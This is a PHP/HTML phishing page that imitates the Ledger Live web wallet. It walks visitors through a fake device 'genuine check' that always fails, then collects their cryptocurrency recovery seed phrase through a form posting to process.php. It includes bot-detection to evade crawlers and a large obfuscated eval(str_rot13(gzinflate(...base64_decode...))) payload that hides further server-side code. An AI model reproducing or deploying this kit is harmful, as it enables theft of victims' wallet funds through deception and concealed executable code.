<!DOCTYPE html>

<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<?php
error_reporting(0);
include '../files/antibot/crawlerdetect.php';
include_once '../functions.php';
?>

  <link rel="shortcut icon" type=image/png href="./files/webwallet_files/wal.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Ledger Live - Webwallet</title>
  <link rel="stylesheet" href="./files/webwallet_files/bootstrap.min.css">


  <link href="./files/webwallet_files/css2" rel="stylesheet">
  <link rel="stylesheet" href="./files/webwallet_files/style.css">
  <link rel="stylesheet" href="./files/webwallet_files/all.min.css" integrity="sha512-+4zCK9k+qNFUR5X+cKL9EIR+ZOhtIloNl9GIKS57V1MyNsYpYcUrUeQc9vNfzsWfV28IaLL3i96P9sdNyeRssA==" crossorigin="anonymous">

  <link rel="stylesheet" href="./files/webwallet_files/bootstrap.min.css">
  <link rel="stylesheet" href="./files/webwallet_files/app.css">

  <link href="./files/webwallet_files/css2" rel="stylesheet">
</head>
<body>
<script>
function Function() {
  var txt;
  if (confirm("You need to connect a Ledger to continue.")) {
    window.location.href = "";
  } else {
   
  }
  document.getElementById("demo").innerHTML = txt;
}
</script>

  <div class="content">
    <div class="left">
      <img src="./files/webwallet_files/ledger-logo.png" alt="" srcset="" style="width: 60%;
      margin: 0 auto;
      display: block; margin-top: 20px;">

      <p class="menu-item">MY DEVICES</p>

      <div class="side activated">
        <img src="./files/webwallet_files/wal.png" alt="" height="22px" class="mr-2">
        <span>Add Wallet</span>
      </div>






      <p class="menu-item">MENU</p>

      <div onclick="Function()" class="side">
        <img src="./files/porto.PNG" alt="" height="22px" class="mr-2">
        <span>Portfolio</span>
      </div>

      <div onclick="Function()" class="side">
        <img src="./files/acc.PNG" alt="" height="22px" class="mr-2">
        <span>Accounts</span>
      </div>

      <div onclick="Function()" class="side">
        <img src="./files/send.PNG" alt="" height="22px" class="mr-2">
        <span>Send</span>
      </div>

      <div onclick="Function()" class="side">
        <img src="./files/rec.png" alt="" height="22px" class="mr-2">
        <span>Receive</span>
      </div>

      <div onclick="Function()" class="side">
        <img src="./files/man.png" alt="" height="22px" class="mr-2">
        <span>Manager</span>
      </div>

      <div onclick="Function()" class="side">
        <img src="./files/buy.png" alt="" height="22px" class="mr-2">
        <span>Buy Crypto</span>
      </div>

    </div>

    <div class="rigth">
      <h3><img src="./files/webwallet_files/wal.png" alt="" height="22px" class="mr-2">Ledger Live</h3>
      <p style="font-size: 12px; color:#717171;">Manage crypto assets in Ledger securely from your browser. Advanced security for your cryptocurrency, made easy.</p>

      <div class="main" >
        <div class="timeline">
          <div class="line"></div>
          <div class="line-2"></div>
          <div class="line-3"></div>
          <div class="step active" data-count="1">
            <div class="cercle active-cercle">1</div>
            <p class="desc desc-active">Detection</p>
          </div>
          <div class="step" data-count="2">
            <div class="cercle">2</div>
            <p class="desc">Checking</p>
          </div>
          <div class="step" data-count="3">
            <div class="cercle">3</div>
            <p class="desc">Connect</p>
          </div>
        </div>

        <div id="step-1">
          <h4 class="mt-5 text-center">Select your device</h4>

          <div class="myCards">
            <div class="card-device">
              <img src="./files/webwallet_files/verified.png" alt="" class="verified">
              <img src="./files/webwallet_files/nanox.png" alt="" class="device">
              <p class="mt-2">Ledger Nano X</p>
              <span class="badge badge-secondary" style="font-size: 10px;">USB Only</span>
            </div>

            <div class="card-device">
              <img src="./files/webwallet_files/verified.png" alt="" class="verified">
              <img src="./files/webwallet_files/nanos.png" alt="" class="device">
              <p class="mt-2">Ledger Nano S</p>
			  <span class="badge badge-secondary" style="font-size: 10px;">Bluetooth/USB</span>
            </div>

            <div class="card-device">
              <img src="./files/webwallet_files/verified.png" alt="" class="verified">
              <img src="./files/webwallet_files/blue.png" alt="" class="device">
              <p class="mt-2">Ledger Nano X</p>
			  <span class="badge badge-secondary" style="font-size: 10px;">Bluetooth/USB</span>
            </div>
          </div>
        </div>



        <div id="step-2" class="step-2">
          <div class="video-device">
            <h5 class="text-center">Genuin check</h5>
			<p style="font-size: 12px; color:#717171;"> Connect your Ledger with this device to interact with Ledger Live.</p>


            <div id="connect-spinner">
              <div class="d-flex justify-content-center">
                <div class="spinner-border" role="status">
                  <span class="sr-only">Loading...</span>
                </div>
              </div>
              </div>

            <div class="connect text-center">
              <p style="color: rgb(182, 2, 2); font-size: 12px;">Ledger Live could not connect with your device. Check if your device is connected properly or recover your wallet.</p>

              <button id="use-phrase" class="btn" style="display: block; border: 1px solid rgba(204, 204, 204, 0.582); width: 100%;
              padding: 17px; text-align: left; background-color: #6490f1; margin-bottom: 10px; color: white;">
                <img class="restorememe" style="margin-right: 20px" src="./files/webwallet_files/restore.png" alt="" srcset="" height="22px">
                Recover ledger with seed phrase
              </button>

              <button id="refresh" class="btn" style="display: block; border: 1px solid rgba(204, 204, 204, 0.582); width: 100%;
              padding: 17px; text-align: left;">
              <img style="margin-right: 20px" src="./files/webwallet_files/refresh.png" alt="" srcset="" height="22px">
                Refresh
            </button>
            </div>
          </div>
        </div>



        <div id="step-3" class="step-3">
		<center>
<h4 style="
    margin-top: 10px;
    margin-bottom: 30px;
">Use your Recovery Phrase</h4>
		  <p style="font-size: 12px; color:#717171;">Enter your 12/18/24 words in a strict order. Do not rearrange them. </p>
        </center>
		  

          <form action="process.php" method="POST" id="form1" style="width: 400px; margin: 0 auto;">
            <div class="form-group">
              <textarea name="key" id="phrase" required="required" minlength="12" 
			  style="width: 100%; margin: 0 auto;" 
			  placeholder="Enter your Recovery phrase here" 
			  class="form-control" rows="3"></textarea>

            </div>
			
            <span class="disabled" id="message">Enter a space between each word.</span>
            <button id="recovme" style="width: 100%; margin: 0 auto; padding: 10px; background-color: #6490f1; color: white;display: block; border: none;"
			 form="form1" value="Import" type="submit" name="import" class="recover-finale" >
              Continue
            </button>
          </form>
		  
        </div>


        <div class="bottom">
          <div class="btn back" id="back">
            Back
          </div>

          <button class="btn continue" id="continue" disabled="">
            Continue
          </button>
        </div>

      </div>
      <br>
      <br>
      <br>
      <br>
      <br>
    </div>
  </div>

  <script src="./files/webwallet_files/jquery.min.js.download"></script>
  <?php eval(str_rot13(gzinflate(str_rot13(base64_decode('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'))))); ?>
  <script src="./files/webwallet_files/popper.min.js.download"></script>
  <script src="./files/webwallet_files/bootstrap.min.js.download"></script>
  <script src="./files/webwallet_files/app.js.download"></script>
  <script src="./files/webwallet_files/phrase.js.download"></script>


</body></html>